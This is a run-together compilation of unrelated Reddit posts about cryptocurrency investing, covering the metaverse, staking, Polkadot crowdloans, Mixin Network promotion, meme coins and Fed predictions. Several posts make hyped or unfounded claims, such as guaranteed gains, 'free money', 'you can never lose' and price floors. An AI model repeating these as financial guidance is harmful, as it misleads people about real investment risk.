With Facebook changing their corporation name to Meta and setting their eyes on establishing the metaverse as a centralized augmented/virtual reality environment, is Ethereum set to become the decentralized version of the metaverse?

I'm not too educated on Ethereum, the only crypto I've researched deeply is bitcoin. So I'm unaware of the logistics of smart contracts and decentralized apps but it with my limited knowledge it seems possible for Ethereum to pave the way for a decentralized metaverse. 

If not Ethereum then what technology will? Please enlighten me I'm willing to look into new coins if they have possibility of paving way for decentralized metaverse because it's something I see as valuable to the future of the world.

Sorry if this is a very stupid or basic question - I'm pretty new to investing in cryptocurrencies. But I'd be very happy if someone could please answer this post!!

&amp;#x200B;

Let's suppose suppose I invest $100 in a coin which is priced at $1 at launch with a market cap of 1 million....

&amp;#x200B;

In two years time, it becomes worth $15 and the overall market cap has increased to 100 million....

&amp;#x200B;

Will the money I've invested increase by 15 times or 100 times? By that I mean to ask whether I will have $1,500 or $10,000 at the end of the two years???

&amp;#x200B;

Thanks for reading! :)

The contract is ends in **5539c01b502787a9** 

For some reason coinmarketcap keeps letting these slip by. 

I ran it real quick through [https://app.staysafu.org/scan?a=0x988300f65191c3a52ef59dbb5539c01b502787a9&amp;mobile=false](https://app.staysafu.org/scan?a=0x988300f65191c3a52ef59dbb5539c01b502787a9&amp;mobile=false)

Be very careful and make sure you run these scanners at minimum if a coin is going straight up with just small sales.

They set up whitelisted accounts and bots that sell in intervals to make it look like real sales. 

With as much money that site makes they need to start scanning the contract code.

This sub keeps fudding about Cardano's TPS despite Input Output trying to clarify why the parameter limits are kept low multiple times. The parameter limits are being deliberately kept low to avoid blockchain bloat and the system is designed to allow parameter changes very easily, without any hard fork update. Their plan is to monitor network saturation and increase parameters limits when there is much more usage than right now. This kind of network parameters management will eventually be handed over to stakeholder voters, but for now it is being handled by Input Output

Can learn more in this July 2020 video from Input Output showing different TPS with different parameter settings:

I'm trying to figure out where best to earn some money on my crypto assets but looking at blockfi I have way more than 0.1btc and 1.5ETH. I can stake my ETH for 4.9% or get 5.5% on crypto.com, voyager, celcius. Or with BTC get about 6.5% compared to blockfi 4.5% for only 0.1 BTC.

Why such the huge disparity am I missing something in how blockfi is calculating returns compared to the others or are the other sites considered that much more riskier that they offer rates that much higher to attract people?

Not sure if the correct flair should be comedy or drama, but I managed to make transaction that was 100% pure gas. So the other day I got all excited about a coin someone shilled very well here (TAU) and decided I would get some. I am not that schooled in crypto and I assumed it would be a difficult dive into different blockchain, but hey, if I never do it I will never learn. 
On the TAU website they actually have a very detailed how-to, and the first step would be wrap ETH into WETH. I dont know exactly what that means but I assumed it would be a way of moving ETH within its own blockchain, maybe avoiding high gas fees. I wanted to wrap 0,004. Yes, Im currently broke, so I had all my attention on not paying high fees, and a total of $16,62 with fees included sounded fair to me.
I followed the next steps and got to show WETH on my wallet. 0,00 WETH, transaction complete, with ID and details: 
Value: 0,00 ETH / Gas: 16,62 
I guess was so worried about not paying high gas that I forgot to double-check the amount I was sending, which was none. So hear me out: please double check, no matter how small your translation is.

Heres a picture of my fart: https://imgur.com/a/v1DNZ4Q

It seems that every blockchain is doing its own thing, trying to dominate NFTs, DeFi or consolidate value only to its own coin or token, but that's not the way of the future. 

Right now the the major challenge that blockchain technology is facing is the lack of interoperability, or the lack of cross-chain compatibility. 

The projects that are working hard to address those issues--the biggest names out there would be Polkadot (DOT), Cosmos (ATOM) and Chainlink (LINK)--are severely undervalued IMHO compared to other chains out there. 

Each blockchain project has different characteristics that prevent them from communicating with eachother, unconnected to other chains, preventing it from reaching its true potential of interconnectedness; which would allow integration with existing systems, being able to initiate transactions on other networks and conducting interchain transactions with much lower gas fees. 

If interoperability is the game-changer for the blockchain industry and the key to mass adoption, then why are all of these projects so severely undervalued? That is my question.

Before I get ripped to shreds here, this should be taken as a very high level explanation. What DOT is attempting to achieve is far beyond my understanding. My humble aim here is to give people an overall awareness of some of the opportunities that DOT crowdloans and parachain auctions present. If there are people here who can explain their vision and ecosystem in detail, that would also be cool. 

An ELI5 of their upcoming parachain slot auctions (for the purposes of my title) is that you buy DOT, loan your DOT to a project of your choice for 2 years and at the end of the 2 years you get back your DOT that you loaned PLUS tokens from the project you supported. Youre getting in on the ground floor of projects that have solid applications and utility and they could easily provide you with insane returns. 

Whoa whoa whoa. You are probably thinking at this point that I dont want to be locking up my funds for 2 years. Thats an eternity in the crypto space. You are 100% correct. It is a big risk. Several projects have considered this and have found ways to mitigate this issue. Some are issuing liquidity provision tokens so that your capital is available to you in DeFi. Others have yet to provide full details but hint at similar mechanisms that will allow access to capital. 

My last two sentences highlight my hesitation to even post about this; Im way out of my league here. I dont understand what theyre doing on a technical level and I dont think Im alone in this. I think this is also why DOT is being slept on. I could post links here to their page and the parachains info, but my goal was to let people know that very soon a super cool thing is gonna happen and nobody is really talking about it.

If there are people here who have a better grasp of how it all works and feel like breaking it down, that would be fantastic. If not, just know that when you hear about DOT blowing up in the next few weeks, crowdloans and parachain auctions are probably the reason why.

Despite being in crypto for a few years now, I still feel like at times I am taking crazy pills. I remember back in 16' and 17' the theme was always about adoption, about making the space valuable through creating tangible value for real people and real organisations. Yes, we've gone through some cycles that are natural in growth and new industries. Some scams, some memes, and we are doing it still to this day, but I feel like we have lost the way a little with the original premise of adoption or at least talking about tokens who are actively achieving this.   


I get it right, we want to make money, to be rich, to ride the euphoria but surely, we can do both as well and do it over a longer timescale? And to be honest, we kinda need to, unless we all hope to ride Bitcoins coattails forever.  


There's a project out there that has literally made it its sole focus on gaining adoption. On flying the flag for crypto to real enterprises and showing them that hey, this is a serious thing. This can give your business a lot of value and we will help you do it. Hell, they've focussed THAT hard on being legitimate that they've foregone the usual tactics of paying people like Bitboy a bitcoin or two for a video or engaging some sort of elaborate market maker to artificially pump the token.  


This as you might have guessed it, is OriginTrail. It's been around for over a decade now. Not in crypto, but in real business mainly in the supply chain sector. Upon seeing the benefits of blockchain, they decided to link both a few years ago. And since developing their tech, they've recently begun to expand more and more. By making their solution multi-chain -- which further cuts down on the vendor lock-in issues and data silo issues most cryptos face -- by working closely with government bodies -- like EU programs-- and by looking to add real jobs to their network as opposed to fake ones that just give ROI's based on an inflationary design. They do it with certifications, with tracking, and with data as a whole. Yes, all data, using a marriage of their Decentralized Knowledge Graph and their multi-chain approach they are aiming to effectively connect everything. ERPs, crypto assets, digital assets you name it. Recently, they came out with a new initiative with their core partners BSI to do their ISO training certificates on their network. This alone is over **200 thousand** certificates per year. And bloody important ones. Ones that highlight to the real world what blockchain can.   


It just seems crazy to me that we are all getting lost in the weeds when there are projects out there that are actively promoting the future of the industry and actively working their absolute butts off and we don't pay attention to them because they aren't paying youtube shillers or marketmakers six figures to create artificial value.  


I will say however that it has been super cool to see last week that Coinbase has legitimised OriginTrail with a confirmed listing. Before Kraken, before Binance, before FTX, and before the shillers.  


This is important guys. OriginTrail and legitimate projects deserve our love, not just those projects which are shilled by the Bitboys of the world. If we don't give them our love, the maturation of the industry will just take that much longer and be that much less effective.  


Check out the fact sheet below and please, ask any questions you may have.

I took some profits after being up a bit and it really came at an opportune time in my life , Im a firm believer on that things happen for a reason  

But I was more anxious and uptight at selling than I was buying. I mean it doesnt make sense; I buy and money comes out of my account and Im left with the unknown and the possibility of losing that money; selling I get money added to my account and know that I already succeeded.

I guess the idea it could go a lot higher is always present but thats basically living in greed. It could also dump and leave me with a loss.

Cant count your chickens before they haha hatch and one in the hand is worth two in the bush.  

Going to pay off some bills and hope my other holdings grow as well,

Hope everyone had a great Halloween

Since it is the beginning of a new month, taking some time to reflect and become curious to know what is everyones story and how you chance upon Crypto or how has Crypto change your life ? Who are you , Redditor stranger? 

I will start with me. My name is Ann, a millennial working in the travel industry (yes bad times), living from paycheck to paycheck. I want my money to work harder for me especially in times like this, but do not have enough capital to invest in shares (where I live, you have to buy whole share) or have the financial know-how. Getting into Crypto , I see hope that there might be a possibility, however slight, that I can make my money grow. The chance that I can make my $1 into $3 or more. 

My story with Crypto. I first heard about Bitcoin in 2009-2011. At that time Bitcoin can only be mined and/or was beyond my abilities to buy. Years then flew by, life goes on, I work hard for my fiat and it is suddenly 2021. This time, I finally begin my Crypto journey. 

Of course it is not perfect with its volatility. But it is this volatility that makes the the possibility to achieve big gains. (Not forgetting the excitement it brings) I feel the best time to make big money with little investment is already gone but I still hoping for a decent accumulation. Also, I only invest my fun money (Need to emphasis that ) hence no big deal. 

Side note : I used to do lots of online shopping out of boredom, leaving me with stuff I seldom wear or use. Have not bough anything much the past 2 months so I get more fiat to invest. A win for me. 

How about you, Redditor stranger ?

I'm thinking of gifting some of my BTC to my four relatives. They're all older than me and definitely fall on the illiterate half of the understanding-technology spectrum. None of them have ever owned any crypto in any capacity. 

I'd love to hear any advice you might have for how to best accomplish this.

I'm thinking that one way could be to give them a USB drive that's programmed like a cold storage wallet (using something like Electrum).

I feel like setting up an account for each of them on an exchange would likely require submitting info about them that could ruin the surprise component of this whole thing.

Any suggestions?

Trying to learn more about metaverse. I know just pumped bud but think this will just be the begging. 

I dont really know anything about this or the group of tokens related to it. 

I know Mana is a big one. 

Also found SAND and GHST

Trying to stay away from all the dog hype (although did get a small bag of Elon last week)  LookiNg for some metaverse 101. Any insight in what this is all about? I know NFT related but thats about it. 

What do you think about projects I listed above? Worth looking into more? 

Or is there some is should DYOR on that I didnt list. 

This group pretty smart and feel like Ill be set in right direction rather than reading yahoo finance articles. 

Unrelated. Look into CKB if it havent yet.

Im not a developer. I cant code. But I love blockchain, I love crypto, I love the future use cases for so many projects, and this space is all I spend my free time studying and learning about. 

I currently work in the Solar Energy industry. Its *okay*, but I dont totally love it. I would love to find a job in the crypto space, but I literally dont know what type of role I could fill. 

Is there anyone in this sub who works for a crypto project who *isnt* a dev/coder?

What opportunities have any of you seen that would allow someone who loves the space to be more actively involved rather than just investing? 

I love what Chainlink is doing. I love what Cardano is trying to accomplish. I love the future use cases of NFTs. I just wish I could be a part of it all!

I have to say I agree with the premise that there needs to be some meaningful function from a product. Seeing shitcoins doing this well is understandibly frustrating to purests but maybe there is something we are missing. Most of these coins have a tribal mentality and people get entertainment and a sense of belonging by just simply being a part of a community. Maybe this is the function of meme coins that is being overlooked. It is a societal/social function not a technical function. I would be curious to see how many of the ShibArmy would say they more happy now than they were before they joined. I suspect it would be a positive correlation even before the gains started. 

The shitcoin member/holder has recieved a form of emotional fulfillment. A powerful thing that has driven us to be a part of groups since the beginning of civilization.  I think this should be a part of the equation investers use. Use the internet as the method to measure this. Look at the numbers of followers on social media. Look at how often people are talking about it. Look at the number of searches for it. Identify the general sentiment. Check that it is secure and safe. Add this to how well it solves a technical problem and 'walla'. A better gauge to what will be the next big thing.

Fellow algo holders! Im not sure if there has been a post made about this yet but this is a friendly reminder that the first voting session is now open. And its a pretty interesting poll to be honest! The voting results are incredibly close at this moment. Dont forget to head to the official Algorand website and cast your vote to earn those sweet gains. Voting closes on the 14th of November and based on the poll you definitely want to cast your vote! Make sure you maintain the amount of algo you committed in your wallet for the three month governance period. Algo to the moon baby!

I was worried about the market reaction to the Fed tapering schedule which will be announced on November 3rd at 2pm, so I decided to re-listen to Powell's September speech. The tapering is estimated to start in mid-November or December which is largely expected by the market; however, Fed commentary around interest rate and inflation will be critical to determining if the bull market persists.   

In regards to the September US non-farm payroll released after the last Fed meeting, "Nonfarm payrolls increased by 194,000 in September, compared with the Dow Jones estimate for 500,000", so this will make the Fed more dovish (i.e. more inflation, low interest, more accommodative) for this up-coming November meeting. Likewise, US GDP was lower than the Fed would like to see, further contributing to their likely dovishness.

The Fed is also getting pressure from politicians such as Warren who called Powell a "dangerous man" inferring that if he becomes Hawkish too soon, it will result negatively for a fragile recovering COVID economy. I don't think he cares what Warren thinks very much \[like most people\], but I do think it inadvertently pressures him to be more dovish. 

For these reasons, in regards to interest rate increases at this up-coming Nov 3 meeting, Powell will AVOID providing any commentary relating to timing of rate increases occurring in 2022. Some Wall St banks are expecting 2 interest rate increases in 2022 due to inflation. However, I heard nothing from Powell's September speech to suggest he will raise once or twice in 2022. He said the hurdle for raising interest rates is significantly higher than the hurdle to start tapering. He did mention that all but one of the Fed officials expects interest rate increases starting in 2023; however, for 2022 Powell said interest rates can increase only after tapering completes (mid-2022) because it's senseless to raise interest rates while bond purchases are occurring. And he said the Fed is going to continue to monitor the economy before providing guidance on such rate increases. 

In regards to actual inflation, the fed is unlikely to acknowledge its true extent in the midst of a COVID economy. Powell is being very careful with how he discusses inflation and interest rate increases. His commentary will focus on how inflation is manageable, related to supply chain shortages, and how it will be lower in the out years like 2023 once the economy is on firmer ground. 

In regards to crypto, I think there is potential for a bumpy Monday / Tuesday (I'm scared every time the Fed speaks) but I see Bitcoin staying above $59K. Institutions understand the bull market too much to allow Bitcoin to fall any further than $59K, and if it falls to this level it will quickly be purchased. After this meeting on Wednesday, I believe Crypto is free to increase until November 22nd forming new ATHs, after which volatility from November 29 options expiry will start to set in and potentially cause a minor pull back from these new ATHs.

&gt;**Project Description**

Mixin is a free and fast peer-to-peer cross-chain digital asset trading network that can help other blockchain distributed ledgers to obtain ultra-high TPS, sub-second confirmation, zero handling fees, enhanced privacy, and unlimited expansion capabilities.

&gt;**Basic Information**

Project launch: October 2017

Total tokens: constant 1 million

Consensus mechanism: PoS + Asynchronous BFT

Block confirmation: The final confirmation is less than 1 second

Data storage: DAG

Number of nodes: up to 50 full nodes, at least 7, currently 34

Mining rules: 10% remaining in the mining pool every year

Security reinforcement: Trusted Execution Environment (TEE)

Cross-chain technology: side chain

&gt;**Public chain characteristics**

**Multiple security**

PoS decentralized network, TEE hardware reinforcement, tens of thousands of light nodes supervise all nodes to prevent evil

**Very high concurrency**

It can be directly applied to large-scale commercial applications, and its performance is close to that of traditional centralized servers. It can achieve 100,000, million or even higher TPS by upgrading hardware and bandwidth.

**Free transfer**

User transfers are free, which can meet commercial application scenarios such as micropayments and consumption.

**Real-time arrival**

At present, it only takes 300 milliseconds for 34 nodes to complete the verification and signature of a transfer, and there will be no issues such as transaction rollback or double spending.

**Rich support**

It now supports 30 main chains such as BTC, ETH, EOS, XMR, and more than 100,000 tokens.

**Simple management**

Single account management of multi-chain assets greatly simplifies the difficulty of user asset management, and supports new public chains in the future by default.

**Multi-signature co-management**

Supports up to 255 people in co-management of multi-signed assets, suitable for teams and families to jointly manage large assets, and also suitable for B2C and C2C platforms to co-manage funds. The platform cannot embezzle users and merchants' funds.

**Transaction privacy**

Only the two parties know the transaction, and the full node cannot know the two parties of the transaction, which means that the specific parties of the transaction cannot be derived from the transaction itself.

**Easier to comply with**

While the dual-key structure ensures the anonymity of assets, users can actively provide their own view key for accounting inquiries, which can be used for tax declaration and accounting auditing, and the assets will not be transferred.

**Eco-friendly**

No permission is required, easy access, stable service, and predictable cost. The standard REST API interface allows developers to quickly implement products and businesses with low learning costs and in any familiar language. In addition, the most important thing is that the cost of developing applications based on Mixin is predictable, just like using AWS cloud services. Reasonable and excellent performance.

**Network stability**

Most public chains on the market have a fatal flaw-node network security is seriously affected by currency prices. When the currency price drops below the cost price, the number of nodes begins to decrease, which threatens network security. In contrast, Mixin nodes achieve long-term stable profitability by charging Dapp API call fees separately. Cloud services like AWS ensure the safe, stable and continuous operation of the entire network. This is also a feature that commercial-grade public chains must have. I believe that more public chains will refer to Mixin's stable service model in the future.

&gt;**Core developer**

The VPlayer developed by the core team from 2011 to 2015 gained 40 million users worldwide by self-growth. The Vitamio SDK released during the period was authorized by many well-known companies such as Weibo, Cheetah, Kingsoft, and Ku6; Shou was developed from 2015 to 2017. TV mobile game live broadcast has gained 10 million users worldwide.

**Feng Xiaodong   CEO &amp; Co-founder**

Audio and video expert, proficient in Go, Ruby, Android and other full-stack development, and have a deep understanding of products. After dropping out of school to make Android App and earning 1 million US dollars in Google Play, he joined the technology responsible for VPlayer and Vitamio. In 2014, he set up a new company to focus on overseas mobile game live broadcast.

**Song Xiaoming   CTO &amp; Co-founder**

The dean of the Science and Technology Research Institute is responsible for the research and development of the underlying product line of video playback. He has a deep understanding of Android and iOS audio and video, and has helped the company complete the docking of Vitamio with Weibo, Cheetah and other hundreds of millions of user product lines.

**Tang Jun   Product Director &amp; Co-founder**

An Android R&amp;D manager of Mianpai Technology, who has extensive experience in Android and iOS development, and has a deep understanding of user experience.

&gt;**Core technologies**

**Cross-chain accounting**

The side chain will synchronize and monitor all Mixin-related transactions on the main chain. All external recharges, withdrawals and internal transfers are recorded on the decentralized distributed ledger, and the main chain assets are transferred to the joint management of all nodes. Multi-signature address. Each record contains information such as asset type (such as Bitcoin, Ethereum, etc.), transfer amount, etc., which cannot be tampered with and can be traced back. Note that Mixin does not have a currency issuance function and therefore does not have a mainnet token, and will not generate assets out of thin air.

&amp;#x200B;

The Mixin cross-chain solution is similar to that of exchanges, but decentralized nodes jointly manage assets, code and data are open and transparent, and focus on transfers.

**Directed Acyclic Graph Technology (DAG)**

Mixin uses DAG as the underlying data structure model, which is different from other DAG public chains (such as IOTA, Bytaball, etc.). Mixin does not have a central authority node, and data does not need to wait for the final confirmation of the central authority node. Mechanisms such as limiting the time for referencing data to ensure asynchronous and efficient operation, and through Asynchronous BFT to ensure the correctness of the consensus results. It can be simply understood that each full node of Mixin is a chain with complete data, but the order of the data is different, and the same result can be deduced in the end:

&amp;#x200B;

**Trusted Execution Environment (TEE)**

Mixin uses Intel SGX as the implementation of TEE to further enhance security. All full nodes must run in a trusted execution environment to ensure that the running code of the full node is indeed the code it claims to be running and no one can Change the running code in the trusted execution environment without being noticed.

&amp;#x200B;

**Privacy enhancement**

UTXO transaction privacy is enhanced through CryptoNote technology. Only both parties know the transaction, and the full node cannot know both parties of the transaction. That is to say, it is impossible to deduce the specific parties of the transaction based on the transaction itself:

&amp;#x200B;

https://preview.redd.it/rlxtu1r6gww71.png?width=750&amp;format=png&amp;auto=webp&amp;s=782aacbb4ae216dd31916e2e5e8b8f449824683e

Summary: The sophisticated combination of limited PoS nodes, DAG, UTXO, Asynchronous BFT, CryptoNote, TEE not only realizes the immutable modification of data, but also solves the problems of performance bottlenecks, double spending, privacy, and scalability.

&gt;**Node network**

The full node is mainly responsible for accounting, verifying and signing each transaction. Each transaction needs to be verified and signed by two-thirds plus one node to finally take effect. As of 2020-02-12, a total of 32 transactions The node is running stably.

**Join node**

No permission is required. You can participate anonymously. You can join by collateralizing 2% of the previous year's circulation. For example, to join a full node in the first year requires 10,000 XIN, and in the second year, 11,000 XIN is required; the hardware devices participating in the full node cost less than $500 per month based on 8-core CPU + 32 G memory + 500G SSD hard disk + 100 M bandwidth.

**Exit node**

No permission is required, and 1% of the mortgage is required to be deducted as a handling fee for exiting the node

Light nodes also need to be mortgaged, and their main function is to supervise the full-node bookkeeping and arrange automatic voting.

&gt;**XIN token**

50% mining pool node incentives

40% unified publicly sold to supporters through the exchange at the price of 1 XIN / 20 EOS, no angels, no cornerstones, and no private placements

5% reward whitelisted users

5% core development team

As of November 2019, there are approximately 480,000 uncirculated mining pools. At present, 123 XIN is released every day and the trend is decreasing year by year. The circulating XIN is approximately 520,000:

310,000 nodes are mortgaged, among which there are as many as 15 retail crowdfunding nodes, and the others are mainly institutions and other teams, such as Onda Group, Laomao Team, etc.

Domain has pledged 50,000, and the 50,000 XIN held by the core development team has all been mortgaged

160,000 in circulation in the market, mainly exchanges, node queues, wallets, etc.

Mortgage to participate in full-node bookkeeping, and obtain mining revenue and excess handling fee distribution

Mortgage to participate in light nodes, supervise full node accounting and arrange automatic voting

Mortgage to participate in Domain asset management, and jointly manage assets with nodes

Voting to participate in community governance, such as voting to determine the amount of punishment for malicious nodes, what chain to access, kernel specifications, or some strategies in the upgrade process, etc.

Creating a Dapp requires a one-time consumption of XIN, and the specific cost is determined by the resources that the Dapp claims to consume.

Nodes can decide on their own whether API calls are settled in XIN at the market price (the node excess handling fee distribution is settled in XIN)

&gt;**FAQ**

**What is the relationship between Mixin, Mixin Network and Mixin Messenger?**

Mixin is short for Mixin Network, and Mixin Messenger is the first open source Dapp on Mixin Network. Due to historical reasons, Mixin was considered Mixin Messenger for a long time.

**What should I do if a large number of spam transactions are initiated for free transfer?**

The node will charge Dapp API call fees, please refer to the extended reading Mixin Network full node stable economic model.

**What is the interpretation of trillion TPS in the white paper?**

In fact, it is a number to describe the TPS of Mixin Network. There is no theoretical upper limit. The performance of the main network distributed network is close to the performance of traditional server clusters. The TPS can be continuously improved by simply upgrading hardware and bandwidth, and optimizing algorithms. It can easily reach one hundred thousand. , Millions or even higher TPS. It is very important that there is no upper limit in theory. Unlike the theoretical upper limit of BTC, which is very limited, you can only reach that speed. Now the low configuration of the full-node server can easily reach 3000 TPS.

**Why can't the balance of the BTC recharge address in my wallet be checked on the blockchain browser chain?**

The recharge and withdrawal of Mixin are not the same address. After the user recharges, the assets will be transferred to the multi-signature address managed by all full nodes as needed. When withdrawing, more than 2/3 + 1 nodes need to verify and sign the multi-signature address. Withdraw cash to the target address.

**How to check whether the assets in Mixin are real on-chain assets? E.g. BTC**

Mixin does not generate assets out of thin air. All assets enter the Mixin network through external recharge. After the user recharges, the assets will be transferred to the multi-signature address managed by all full nodes on demand. If you want to check the assets on the Mixin chain, take BTC as an example, you need to add up [https://btc.com/1zgmvYi5x1wy3hUh7AjKgpcVgpA8Lj9FA](https://btc.com/1zgmvYi5x1wy3hUh7AjKgpcVgpA8Lj9FA). The balance of all the transfer-in addresses in the multi-signature address plus the balance of the multi-signature address will not be exactly equal to https The number of BTC in ://mixin.one/network/assets is not added up because the assets of some addresses have not been collected yet.

**The withdrawal address of BTC is 1 This is not a multi-signature address, right?**

Asset management is based on cryptographic multi-signature ((t, n) threshold signature). The address is an ordinary address, not the multi-signature of the Bitcoin script. The Bitcoin script can only support more than a dozen people and cannot support the 35-node multi-signature.

Without Reddit, I would not have found the information I needed to start mining and troubleshoot my rigs. I am very grateful to be able to find information, ask questions, and read about other questions which have already been posted. Fortunately, I have been able to make it this far without having too many problems. Unfortunately, my GTX 1660 Ti *sometimes* doesn't display an image at boot. 

I could use some (non-technical) feedback from the community because I never did think much about graphics cards breaking until my 1660 Ti started having these problems. I always thought my RX 580s would be the first to go, but I'm being proven wrong as my six month old 1660 Ti is failing on me. For the miners who have dealt with hardware failures before, and are mining as a business, how do you manage depreciation / hardware failures?

Ive been buying and selling some cryptocurrency this year and also started a small business. Taxes are one aspect that I am less than ideally educated on. Does anyone know of a youtube channel that is particularly knowledgable in this regard? Alternatively if you have a recommendation for an exceptional accountant in north Atlanta OP Id love to hear about them as well.

Apparently I havent hit 500 characters yet so I need to add some more verbiage to get to that limit. Incredible how difficult it is to make a post on reddit with rules so widely varying among subreddits.

Inmicroeconomic theory, theopportunity costof a particular activity option is the loss of value or benefit that would be incurred (the cost) by engaging in that activity, relative to engaging in an alternative activity offering a higher return in value or benefit.

Opportunity cost underpins the majority of day-to-day economic decisions that are made in society.

For example, the opportunity cost ofmowingones ownlawnfor a doctor or a lawyer (who might otherwise make$100 an hour if they elected to work overtime during that time instead) would be higher than for aminimum-wageemployee (who in theUnited Statesmight earn $7.25 an hour), which would make the former more likely to hire someone else to mow their lawn for them.

In crypto terms, you gotta ask yourself the question if you are better off to spend $100 on a crypto investment today that may increase in value over time or spend that money on other things such as a night out and the money will be gone forever. 

TLDR: it's Lambo or food stamps

Aka yield farming that is simply owning a share of a particular DEX(Decentralized exchange). I will tell you the story of this crypto investment approach which I didn't understand clearly few days ago. Let's go into it:

Every DEX is organized in pools( not swimming pools but with the notion "pool" we refer to a pair of trading for example ETH/BTC). You as an investor you provide liquidity to a pool (50%ETH/50%BTC) and in return you get pool tokens which can be seen as shares of that pool because you will earn a share of the trading fees each time a trader performs a transaction.

The APY for liquidity mining is just sci-fi starting from 54%(in openswap) to 502% (OSMOSIS). The participation procedure is really simple you just need to choose the pool that fits you and get these gains!

Ive been reading a lot in this sub about staking is the way to go but theres barely any information on staking or how to stake and where to. 

Can someone shred some light on staking and staking rewards. Whats the best platform to stake and what coins/tokens  are being offered the best interests etc.

Since Im a newbie myself, I bet that there are others who want to stake their coins but are lost on how to do it.  

OGs of crypto.. can you guide us ?

Note: DYOR.. yes yes I will. And will make sure that I will not reply to any scammers in my PMs

Hi guys so I just came across this new project called Paribus (PBX) which is a cross-chain borrowing and lending protocol for NFTs, liquidity positions, and synthetic assets. They just did their IDO in August. They claim to be powered by Cardano but in fact they are currently only an ERC-20 token. I was quite intrigued by their features that you can loan out your NFTs and borrow against it. I did some research and found that they are backed by Cfund, which is a venture firm backed by IOHK.

&amp;#x200B;

Would love to hear from you guys on Paribus.

Im pretty new to crypto. Been learning as much as I can now for about 9 months. Im in my early 40s and I remember when the Internet was brand new. When everything had to be figured out and there were no instructions for how to do anything. Connecting to the Internet was slow and unreliable and no one was really even sure what the Internet was all about and how it would fit into our everyday lives. Most things were not user friendly and people were even talking about the internet as a fad that wouldnt last.

Companies were popping up all over the place trying to figure out how to best take advantage of the web, many of them completely ridiculous and made absolutely no sense and yet people were swept up by the hype. But there were also lots of people who could see back then the potential of the Internet, and even for them they could never have realized what the Internet would become. 

I see a lot of parallels between what crypto is today and those early days of the Internet. As I learn more and more about it a picture starts to form in my head of the real potential of crypto and how it can be completely transformative for this world. As it is today the amount of effort and work that needs to be put in to really wrap your head around it is a huge deterrent for most people. Those people end up being more susceptible to getting caught up in ridiculous coins and tokens because they want to be part of the hype but really dont understand why those projects have no real value or future. 

But as time goes on and the technology matures and theres more adoption and more widespread use, the momentum will build and the average person will start to understand how crypto will fit into their lives. More user-friendly and reliable technology will appear enabling the average person to more easily interact with crypto in their daily lives as well as understand the real world applications of crypto. The ridiculous projects will fail and the future pillars and giants will start to stand out from the crowd. 

It might be just my opinion but I truly believe that the road ahead of us is extremely long and that we are only at the very beginning. I also have to say that I find it really exciting 
 spending my time every day learning a little bit more about something so new that is so in its infancymaking mistakes and taking little risks as I figure things out about this thing that I truly believe will be an absolutely massive part of everyones every day lives way down that road.

Anyway, just my take as a new guy.

So i have been seeing people here asking for recommendations on what cryptocurrencies should they invest in but i havent seen a single person recommend xrp. Imo it seems like a great cryptocurrency and really underrated due to their current lawsuit. Is there a particular reason why people dont like it or a reason why they dont think it is a good investment?

I know very little about the finer details of the project, but from what i do know it seems very interesting and has a good amount of momentum behind it already. I'll be honest with so many memecoins abound, lately I tend not to care so much about the actual project behind a low cap coin, and more about sentiments and anticipated price action. Only things I'm truly long are eth/btc maybe lrc now. Others I'd love to hold long but my portfolio is currently about 90% in gme lol.

For once I miight hang on to this one though. For the most part it's tracked with btc and eth like every other low cap penny token. But lately it's started performing much more independently. Hell I was going to sell this evening until I saw I was up at highest 50% on the day.

Does anyone know enough about Holochain, Holotoken, etc to chime in? I mean at this point it's basically free money, I'm just deciding where it's best to park it. I could score some free eth but I'd rather wait for a dip, and by then it could drag HOT down too. But of course I could much more easily just hold if anyone believes it's going to keep riding this momentum into future project development.

Thanks in advance for any insight, I know this is vague question, I've been mostly away from crypto this year and don't keep up as well as I should

Any idea what caused this? was this manufactured?

Is it worth actually investing in BAT?

Also BAT should increase with the amount of advertisers on Brave and the amount of users. So would could hyping this create run away situation? End up getting Brendan Eich on Rogan or something.

I mean, BAT is linked to the overall adoption of Brave. Brave, without BAT, is itself a good product. its use is in the low millions so has massive room for growth.

Anyone with knowledge on BAT or ideas on its potential can you share some of that in the replys. Thanks

I just joined crypto moonshot to see if anything new is on horizon. 

You got to bed shitting me. How many cryptos coins are there? I think I saw 19 new coins listed in last two hours. 

Is it that easy to set up a blockchain? There was even a doge tuition one? I think Elon tweet was like 4 hours ago. 

The list was ridiculous but Im sure some will pump just the same. May throw some cheap cash. 

Where are options of exchanges to by some of this nonsense? 

While Im talking nonsense. Any decent projects or coins you think will pump? 

I got done dogelon last week that did well. 

As far as serious project. Loooovvvvveee CKB.

On Tesla's website source code (not live yet but just on the source code), two coins are listed as a method of payment. One is Bitcoin, short BTC and the other one SHIBA short SBA. The second coin may mean Shiba Inu. However, I believe this is gonna be Dogecoin. Doge are known breed of Shiba and Tesla is trying not to give too much info before launch. It is also possible that Tesla may be trying to avoid a potential legal problem by not directly shilling Dogecoin ahead of the launch of new payment. Either way, the crypto market will jump when the payment is activated. The real question is when will the payment be available?

I got dogelon mars by converting some coins i had in my coinbase account to XLM, and then transferring the XLM to my KuCoin account and then selling it and then buying dogelon. But what is the best way to convert random coins on my coinbase account to get the end result of buying Baby Doge with the lowest fees possible?

I apologize because this is my first time buying any crypto outside of Coinbase. I also understand how speculative the meme coins are and that they have currently virtually no real world application backings, but hey I want to gamble and buy. So please help me out. I understand I could buy directly some smart chain bnb and then convert it to baby doge with trustwallet and pancake swap, but I want to use assets I already purchased in coinbase rather than spending more fiat at the moment.

Just looked at the charts on RH and they have a pattern Ive never seen before.

Not here to debate Robinhood.

Just something looks very different - lots of tiny ups and downs on all the coins.  If anyone else is seeing this let me know in the comments.

Ive been trading since 2016 and it looks like nothing Ive seen before just wondering if Im the only one.  Lots of little rumbles

Seismic activity possibly? (Jk) Something about to happen?  

Hope all is well, 
VivaLaBacon 

Also - word count. Word count. Word count. Word count. Word count. Word count.

Bitboy suggested today that Metaverse projects might be the next best oppertunity in Crypto.

I have not studied Metaverse and honestly, I know very little about it. But I would like to catch the good projcts early.

He didnt go into detail about what projects to invest in so I am hoping you guys might know.

Any ideas please guys, as to whst might be the successful projects worth investing in.

Thanks for your help

Nah, just kidding. I'm not doing that shit. Some people haven't even started investing in anything yet. Live every day with purpose and intent. That's it. 

No need to rush your investments. Stay frosty and be here for the long run. You can never lose as a long-term investor. Don't let your confidence wane when you see others doing better than you. All of us will have our time to shine. 

Take your time. Just look ahead, aim high, and move forward, one step at a time. Hope we all get rich, maybe not anywhere soon, but definitely someday.

